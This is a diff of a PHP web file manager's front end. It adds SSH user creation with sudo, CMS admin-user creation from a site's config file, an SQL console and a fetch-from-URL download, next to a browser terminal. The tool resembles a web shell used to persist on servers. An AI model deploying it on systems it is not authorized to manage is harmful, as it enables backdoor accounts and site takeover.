   <?php if($totalSize>0):?><div class="bs"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg><strong><?=fmtSz($totalSize)?></strong></div><?php endif;?>
-  <div class="bs bs-click" id="sbDisk" title="Disk usage — click for server details"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg><strong id="sbDiskV"><?=$ss['disk_pct']?>%</strong>&nbsp;disk</div>
+  <div class="bs bs-click" id="sbDisk" title="Disk usage - click for server details"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg><strong id="sbDiskV"><?=$ss['disk_pct']?>%</strong>&nbsp;disk</div>
   <?php if($ss['load']):?>
-  <div class="bs bs-click" id="sbLoad" title="CPU load average (1m / 5m / 15m) — click for server details"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg><strong id="sbLoadV"><?=implode(' ',$ss['load'])?></strong></div>
+  <div class="bs bs-click" id="sbLoad" title="CPU load average (1m / 5m / 15m) - click for server details"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg><strong id="sbLoadV"><?=implode(' ',$ss['load'])?></strong></div>
   <?php endif;?>
   <?php if($ss['mem_total']>0):?>
-  <div class="bs bs-click" id="sbMem" title="RAM usage — click for server details"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="15" x2="23" y2="15"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="15" x2="4" y2="15"/></svg><strong id="sbMemV"><?=$ss['mem_pct']?>%</strong>&nbsp;ram</div>
+  <div class="bs bs-click" id="sbMem" title="RAM usage - click for server details"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="15" x2="23" y2="15"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="15" x2="4" y2="15"/></svg><strong id="sbMemV"><?=$ss['mem_pct']?>%</strong>&nbsp;ram</div>
   <?php endif;?>
   <?php if($ss['uptime']>0):?>
-  <div class="bs bs-click" title="Server uptime — click for server details"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="sbUptimeV"><?=fmtUptime($ss['uptime'])?></strong></div>
+  <div class="bs bs-click" title="Server uptime - click for server details"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="sbUptimeV"><?=fmtUptime($ss['uptime'])?></strong></div>
   <?php endif;?>
   <div class="br">
     <div class="bs" id="selStat" style="display:none"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg><strong id="selCount">0</strong>&nbsp;selected</div>
@@ -1481,7 +2439,11 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <input type="hidden" name="action" id="af_a"><input type="hidden" name="item_name" id="af_n">
   <input type="hidden" name="old_name" id="af_o"><input type="hidden" name="new_name" id="af_nw">
   <input type="hidden" name="items" id="af_items"><input type="hidden" name="target" id="af_tgt">
-  <input type="hidden" name="trash_id" id="af_tr">
+  <input type="hidden" name="trash_id" id="af_tr"><input type="hidden" name="perm" id="af_perm">
+  <input type="hidden" name="color" id="af_color"><input type="hidden" name="label" id="af_label">
+  <input type="hidden" name="config_path" id="af_cfg"><input type="hidden" name="cms_id" id="af_cid">
+  <input type="hidden" name="cms_role" id="af_crole"><input type="hidden" name="url" id="af_url">
+  <input type="hidden" name="fname" id="af_fname">
 </form>
 
 <!-- CONTEXT MENU (desktop) -->
@@ -1522,7 +2484,8 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="prev-box">
     <div class="prev-head">
       <span id="prevName"></span>
-      <a id="prevDl" class="btn btn-xs btn-g" href="#" download style="margin-left:auto;margin-right:6px"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</a>
+      <button type="button" id="prevMdToggle" class="btn btn-xs btn-g" style="margin-left:auto;margin-right:6px;display:none"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span id="prevMdToggleLabel">View Source</span></button>
+      <a id="prevDl" class="btn btn-xs btn-g" href="#" download style="margin-right:6px"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</a>
       <button type="button" class="btn btn-icon btn-g" id="prevClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
     <div class="prev-body" id="prevBody"></div>
@@ -1535,14 +2498,14 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="mod mod-lg">
     <div class="mod-head">
       <div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
-      <span class="mod-title">Terminal — <?=htmlspecialchars($fm->getCwd())?></span>
+      <span class="mod-title">Terminal - <?=htmlspecialchars($fm->getCwd())?></span>
       <button class="btn btn-icon btn-g" id="termClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
     <div class="mod-body" style="padding:14px;background:var(--surf)">
       <div class="term-win" id="termWin">
         <div class="term-titlebar">
           <div class="term-dots"><div class="term-dot r" id="td-r" title="Close" style="cursor:pointer"></div><div class="term-dot y" title="Minimize"></div><div class="term-dot g" title="Maximize"></div></div>
-          <div class="term-title">bash — <?=htmlspecialchars(basename($fm->getCwd()))?></div>
+          <div class="term-title">bash - <?=htmlspecialchars(basename($fm->getCwd()))?></div>
           <button class="btn btn-xs btn-g" id="termClear" style="padding:2px 8px;font-size:10px">clear</button>
         </div>
         <div class="term-out" id="termOut">
@@ -1618,10 +2581,11 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="mod mod-sm">
     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div><span class="mod-title">Network Speed Test</span><button class="btn btn-icon btn-g" id="speedClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
     <div class="mod-body">
+      <div style="font-size:11.5px;color:var(--t3);margin-bottom:10px;line-height:1.5">Measures the <strong style="color:var(--t2)">server's</strong> own internet connection — run entirely on the server, independent of your own connection speed.</div>
       <div class="info-g" style="grid-template-columns:1fr 1fr 1fr">
-        <div class="info-c"><div class="info-cl">Ping</div><div class="info-cv" id="spPing">—</div></div>
-        <div class="info-c"><div class="info-cl">Download</div><div class="info-cv" id="spDown">—</div></div>
-        <div class="info-c"><div class="info-cl">Upload</div><div class="info-cv" id="spUp">—</div></div>
+        <div class="info-c"><div class="info-cl">Ping</div><div class="info-cv" id="spPing">-</div></div>
+        <div class="info-c"><div class="info-cl">Download</div><div class="info-cv" id="spDown">-</div></div>
+        <div class="info-c"><div class="info-cl">Upload</div><div class="info-cv" id="spUp">-</div></div>
       </div>
       <button type="button" id="spRun" class="btn btn-p" style="width:100%;margin-top:6px"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Run Test</button>
       <div id="spStatus" style="text-align:center;font-size:11.5px;color:var(--t3);margin-top:8px"></div>
@@ -1646,6 +2610,151 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="mod mod-lg">
     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">Environment Variables</span><button class="btn btn-icon btn-g" id="envClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
     <div class="mod-body" style="padding:0" id="envBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+  </div>
+</div>
+<!-- SSH ACCESS MODAL -->
+<div class="mod-ov" id="sshOv">
+  <div class="mod mod-lg">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">SSH Access</span><button class="btn btn-icon btn-g" id="sshClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
+      <button class="ssh-tab-btn ssh-tab-active" data-tab="status" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #818cf8;color:#818cf8;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Server Status</button>
+      <button class="ssh-tab-btn" data-tab="users" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">User Management</button>
+    </div>
+    <div class="mod-body" id="sshBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+    <div class="mod-body" id="sshUsersBody" style="display:none;padding:0"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+  </div>
+</div>
+
+<!-- SSH ADD USER MODAL -->
+<div class="mod-ov" id="sshAddOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title">New SSH User</span><button class="btn btn-icon btn-g" id="sshAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <div id="sshAddFeedback"></div>
+      <label class="lbl">Username</label>
+      <input type="text" id="sshAddUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. deploy">
+      <label class="lbl">Password</label>
+      <input type="text" id="sshAddPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Leave blank for no password">
+      <label class="lbl">Login Shell</label>
+      <select id="sshAddShell" class="inp" style="width:100%;margin-bottom:10px">
+        <option value="/bin/bash">/bin/bash (recommended)</option>
+        <option value="/bin/sh">/bin/sh</option>
+        <option value="/bin/rbash">/bin/rbash (restricted)</option>
+        <option value="/usr/bin/zsh">/usr/bin/zsh</option>
+      </select>
+      <label class="lbl" style="display:flex;align-items:center;gap:8px;cursor:pointer">
+        <input type="checkbox" id="sshAddSudo" style="width:14px;height:14px;accent-color:#818cf8"> Grant sudo (admin) privileges
+      </label>
+      <div style="margin:10px 0 6px">
+        <label class="lbl">SSH Public Key <span style="font-weight:400;text-transform:none;color:var(--t3)">(optional)</span></label>
+        <textarea id="sshAddKey" class="inp" rows="3" style="width:100%;font-family:monospace;font-size:11.5px;resize:vertical" placeholder="ssh-rsa AAAA... or ssh-ed25519 AAAA..."></textarea>
+      </div>
+      <button type="button" id="sshAddApply" class="btn btn-p" style="width:100%;margin-top:4px">Create SSH User</button>
+    </div>
+  </div>
+</div>
+
+<!-- SSH EDIT USER MODAL -->
+<div class="mod-ov" id="sshEditOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></div><span class="mod-title" id="sshEditTitle">Edit User</span><button class="btn btn-icon btn-g" id="sshEditClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <input type="hidden" id="sshEditUser">
+      <div id="sshEditFeedback"></div>
+      <div style="display:flex;flex-direction:column;gap:14px">
+        <div>
+          <label class="lbl">Change Password</label>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="sshEditPass" class="inp" style="flex:1" placeholder="New password (min 6 chars)">
+            <button type="button" id="sshEditPassBtn" class="btn btn-s" style="white-space:nowrap">Set Password</button>
+          </div>
+        </div>
+        <div>
+          <label class="lbl">Change Login Shell</label>
+          <div style="display:flex;gap:8px">
+            <select id="sshEditShell" class="inp" style="flex:1">
+              <option value="/bin/bash">/bin/bash</option>
+              <option value="/bin/sh">/bin/sh</option>
+              <option value="/bin/rbash">/bin/rbash (restricted)</option>
+              <option value="/usr/bin/zsh">/usr/bin/zsh</option>
+            </select>
+            <button type="button" id="sshEditShellBtn" class="btn btn-s" style="white-space:nowrap">Set Shell</button>
+          </div>
+        </div>
+        <div>
+          <label class="lbl">Add SSH Public Key</label>
+          <textarea id="sshEditKey" class="inp" rows="3" style="width:100%;font-family:monospace;font-size:11.5px;resize:vertical;margin-bottom:8px" placeholder="ssh-rsa AAAA... or ssh-ed25519 AAAA..."></textarea>
+          <button type="button" id="sshEditKeyBtn" class="btn btn-s" style="width:100%">Add Public Key</button>
+        </div>
+        <div style="display:flex;gap:8px;padding-top:4px;border-top:1px solid var(--b2)">
+          <button type="button" id="sshEditSudoBtn" class="btn btn-s" style="flex:1"></button>
+          <button type="button" id="sshEditLockBtn" class="btn btn-s" style="flex:1"></button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CMS MANAGER MODAL -->
+<div class="mod-ov" id="cmsOv">
+  <div class="mod mod-lg">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div><span class="mod-title">CMS Manager</span><button class="btn btn-icon btn-g" id="cmsClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body" style="padding:0" id="cmsBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+  </div>
+</div>
+
+<!-- CMS CREATE USER MODAL -->
+<div class="mod-ov" id="cmsAddOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title">New CMS User</span><button class="btn btn-icon btn-g" id="cmsAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <input type="hidden" id="cmsAddCfg">
+      <label class="lbl">Username</label>
+      <input type="text" id="cmsAddUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="login_name">
+      <label class="lbl">Email</label>
+      <input type="email" id="cmsAddEmail" class="inp" style="width:100%;margin-bottom:10px" placeholder="user@example.com">
+      <label class="lbl">Password</label>
+      <input type="text" id="cmsAddPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Min 6 characters">
+      <label class="lbl">Role</label>
+      <select id="cmsAddRole" class="inp" style="width:100%;margin-bottom:14px"></select>
+      <button type="button" id="cmsAddApply" class="btn btn-p" style="width:100%">Create User</button>
+    </div>
+  </div>
+</div>
+
+<!-- CMS EDIT USER MODAL -->
+<div class="mod-ov" id="cmsEditOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></div><span class="mod-title" id="cmsEditTitle">Edit User</span><button class="btn btn-icon btn-g" id="cmsEditClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <label class="lbl">Change Role</label>
+      <select id="cmsEditRole" class="inp" style="width:100%;margin-bottom:14px"></select>
+      <label class="lbl">New Password <span style="font-weight:400;text-transform:none;color:var(--t3)">(leave blank to keep current)</span></label>
+      <input type="text" id="cmsEditPass" class="inp" style="width:100%;margin-bottom:16px" placeholder="Min 6 characters">
+      <button type="button" id="cmsEditApply" class="btn btn-p" style="width:100%">Save Changes</button>
+    </div>
+  </div>
+</div>
+<?php endif;?>
+
+<!-- SQL MANAGER MODAL -->
+<?php if(!empty($_SESSION['fm_admin'])):?>
+<div class="mod-ov" id="sqlOv">
+  <div class="mod mod-lg">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg></div><span class="mod-title">SQL Manager</span><button class="btn btn-icon btn-g" id="sqlClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body" style="padding:0" id="sqlBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
+  </div>
+</div>
+<!-- SQL QUERY MODAL -->
+<div class="mod-ov" id="sqlQueryOv">
+  <div class="mod mod-lg">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title" id="sqlQTitle">SQL Query</span><button class="btn btn-icon btn-g" id="sqlQClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <div style="font-size:11px;color:var(--t3);margin-bottom:8px">Connected to: <strong style="color:var(--t2)" id="sqlQDbLabel"></strong></div>
+      <textarea id="sqlQueryInput" class="inp" style="width:100%;height:120px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical;margin-bottom:10px;line-height:1.5" placeholder="SELECT * FROM users LIMIT 100;"></textarea>
+      <button class="btn btn-p" id="sqlRunBtn" style="margin-bottom:14px"><svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;margin-right:5px;vertical-align:-2px"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Run Query</button>
+      <div id="sqlQueryOut" style="border:1px solid var(--border);border-radius:8px;overflow:hidden;min-height:40px"></div>
+    </div>
   </div>
 </div>
 <?php endif;?>
@@ -1694,6 +2803,52 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <div><label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px">Link name (in current folder)</label><input type="text" name="sym_name" class="inp" style="width:100%" placeholder="link-name" required></div>
         <button type="submit" class="btn btn-p"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/></svg>Create Symlink</button>
       </form>
+    </div>
+  </div>
+</div>
+
+<!-- REMOTE DOWNLOAD MODAL -->
+<div class="mod-ov" id="remoteDlOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div><span class="mod-title">Download from URL</span><button class="btn btn-icon btn-g" id="remoteDlClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">URL</label>
+      <input type="text" id="rdUrl" class="inp" placeholder="https://example.com/file.zip" style="width:100%;margin-bottom:12px">
+      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Save as (optional)</label>
+      <input type="text" id="rdName" class="inp" placeholder="Leave blank to auto-detect" style="width:100%;margin-bottom:14px">
+      <div style="font-size:11.5px;color:var(--t3);margin-bottom:14px">Downloads directly to <span class="mono" id="rdCwd"></span>. Max 200 MB, http/https only.</div>
+      <button type="button" id="rdApply" class="btn btn-p" style="width:100%">Download</button>
+    </div>
+  </div>
+</div>
+
+<!-- TAG MODAL -->
+<div class="mod-ov" id="tagOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/></svg></div><span class="mod-title" id="tagTitle">Tag</span><button class="btn btn-icon btn-g" id="tagClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <input type="hidden" id="tagItemName">
+      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Color</label>
+      <div id="tagSwatches" style="margin-bottom:14px"></div>
+      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Label (optional)</label>
+      <input type="text" id="tagLabel" class="inp" placeholder="e.g. Important" maxlength="24" style="width:100%;margin-bottom:14px">
+      <div style="display:flex;gap:8px">
+        <button type="button" id="tagApply" class="btn btn-p" style="flex:1">Apply Tag</button>
+        <button type="button" id="tagRemove" class="btn btn-g" style="flex:1">Remove Tag</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BULK CHMOD MODAL -->
+<div class="mod-ov" id="bulkChmodOv">
+  <div class="mod mod-sm">
+    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div><span class="mod-title" id="bcTitle">Change Permissions</span><button class="btn btn-icon btn-g" id="bcClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
+    <div class="mod-body">
+      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Permission (octal)</label>
+      <input type="text" id="bcPerm" class="inp" value="755" placeholder="e.g. 755" style="width:100%;margin-bottom:12px;font-family:'JetBrains Mono',monospace">
+      <div style="font-size:11.5px;color:var(--t3);margin-bottom:14px">Applies to all selected items (not recursive into subfolders).</div>
+      <button type="button" id="bcApply" class="btn btn-p" style="width:100%">Apply</button>
     </div>
   </div>
 </div>
@@ -1847,12 +3002,33 @@ function applyView(){if(isGrid){lv&&(lv.style.display='none');gv&&(gv.style.disp
 applyView();
 document.getElementById('viewBtn')?.addEventListener('click',()=>{isGrid=!isGrid;localStorage.setItem('fm_view',isGrid?'grid':'list');applyView();});
 
+/* ── Theme toggle (shared across all users/devices, saved server-side) ── */
+(function(){
+  const sunIco=document.getElementById('themeIcoSun'),moonIco=document.getElementById('themeIcoMoon');
+  function applyThemeIcon(t){
+    if(!sunIco||!moonIco)return;
+    if(t==='light'){sunIco.style.display='';moonIco.style.display='none';}
+    else{sunIco.style.display='none';moonIco.style.display='';}
+  }
+  applyThemeIcon(document.documentElement.getAttribute('data-theme')||'dark');
+  document.getElementById('themeBtn')?.addEventListener('click',async()=>{
+    const cur=document.documentElement.getAttribute('data-theme')||'dark';
+    const next=cur==='light'?'dark':'light';
+    document.documentElement.setAttribute('data-theme',next);
+    applyThemeIcon(next);
+    try{
+      const fd=new FormData();fd.append('theme',next);
+      await fetch('?x=set_theme',{method:'POST',body:fd});
+    }catch(e){}
+  });
+})();
+
 /* ═══════════════════════════════════════
    FORM SUBMIT HELPER
 ═══════════════════════════════════════ */
 function af(action,fields){
   document.getElementById('af_a').value=action;
-  const map={item_name:'af_n',old_name:'af_o',new_name:'af_nw',items:'af_items',target:'af_tgt',trash_id:'af_tr'};
+  const map={item_name:'af_n',old_name:'af_o',new_name:'af_nw',items:'af_items',target:'af_tgt',trash_id:'af_tr',perm:'af_perm',color:'af_color',label:'af_label',config_path:'af_cfg',cms_id:'af_cid',cms_role:'af_crole',url:'af_url',fname:'af_fname'};
   Object.entries(map).forEach(([k,id])=>{document.getElementById(id).value='';});
   Object.entries(fields).forEach(([k,v])=>{const id=map[k];if(id)document.getElementById(id).value=v;});
   document.getElementById('af').submit();
@@ -2005,6 +3181,8 @@ function openSheet(name,isDir,raw,type,size){
     !isDir?{icon:'<path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>',label:'Edit',cls:'sh-blue',act:()=>doAction('edit',name)}:null,
     !isDir?{icon:'<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>',label:'Download',cls:'sh-blue',act:()=>{if(raw)location.href=raw+'&dl=1';}}:null,
     {icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Copy Path',cls:'',act:()=>{navigator.clipboard.writeText(CWD+'/'+name).then(()=>toast('Path copied!'));}},
+    (!isDir&&['text','code','data','config','markdown'].includes(type))?{icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Copy Content',cls:'',act:()=>copyFileContent(name)}:null,
+    !RO?{icon:'<circle cx="13.5" cy="6.5" r=".5"/><circle cx="17.5" cy="10.5" r=".5"/><circle cx="8.5" cy="7.5" r=".5"/><circle cx="6.5" cy="12.5" r=".5"/><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/>',label:'Tag',cls:'',act:()=>openTag(name)}:null,
     !isDir?{icon:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',label:'Checksum',cls:'sh-purp',act:()=>openHash(name)}:null,
     !RO&&!isDir?{icon:'<circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>',label:'Share Link',cls:'',act:()=>openShareCreate(name)}:null,
